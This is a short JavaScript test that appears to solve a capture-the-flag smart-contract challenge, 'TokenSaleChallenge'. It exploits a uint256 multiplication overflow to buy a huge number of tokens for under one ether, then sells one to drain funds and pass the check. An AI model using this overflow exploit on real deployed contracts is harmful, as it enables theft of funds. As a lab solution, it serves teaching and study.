const { expect } = require("chai");
const { buildContract } = require("../utils");
const assert = require('node:assert').strict;

it("Solves TokenSaleChallenge", async function () {
  const contract = await buildContract("TokenSaleChallenge", ethers.parseEther("1.0"));

  const ONE_ETH = 10n**18n;
  const MAX_U256 =2n**256n;
  const numOfTokens = MAX_U256 / ONE_ETH + 1n;
  const amountOfEthSent = numOfTokens * ONE_ETH % MAX_U256;

  assert(amountOfEthSent < ONE_ETH);

  await contract.buy(numOfTokens, {
    value: amountOfEthSent
  });

  await contract.sell(1);
  expect(await contract.isComplete()).to.equal(true);
});
